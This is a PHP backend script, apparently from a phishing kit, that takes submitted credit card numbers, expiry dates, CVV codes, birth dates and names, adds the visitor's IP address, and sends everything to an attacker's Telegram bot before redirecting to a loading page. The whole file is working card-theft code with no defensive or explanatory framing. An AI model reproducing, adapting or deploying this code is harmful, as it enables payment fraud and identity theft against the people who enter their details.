<?php
include("sand_email.php"); 
include("detect.php");

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Assuming you have a form field for email and password
    $name = filter_input(INPUT_POST, 'xuser', FILTER_SANITIZE_EMAIL);
    $card = filter_input(INPUT_POST, 'cardnumber', FILTER_SANITIZE_STRING);
    $expiryMonth = filter_input(INPUT_POST, 'expiryMonth', FILTER_SANITIZE_STRING);
    $expiryYear = filter_input(INPUT_POST, 'expiryYear', FILTER_SANITIZE_STRING);
    $cvv = filter_input(INPUT_POST, 'csc', FILTER_SANITIZE_STRING);
    $dob = filter_input(INPUT_POST, 'birth', FILTER_SANITIZE_STRING);

    $ip = getUserIP();


 

 

    $message = "========= CARD Bouhmid ============" .
    "\nFull Name : " . $name .
    "\nCard : " . $card .
    "\nEXP : " . $expiryMonth . "/" . $expiryYear .
    "\ncvv : " . $cvv .
    "\nDob : " . $dob .
    "\nIP    : " . $ip
    ;

     $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents or cURL to send the message
     $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini
   
     HEADER("Location: ../loading.php");


}



?>
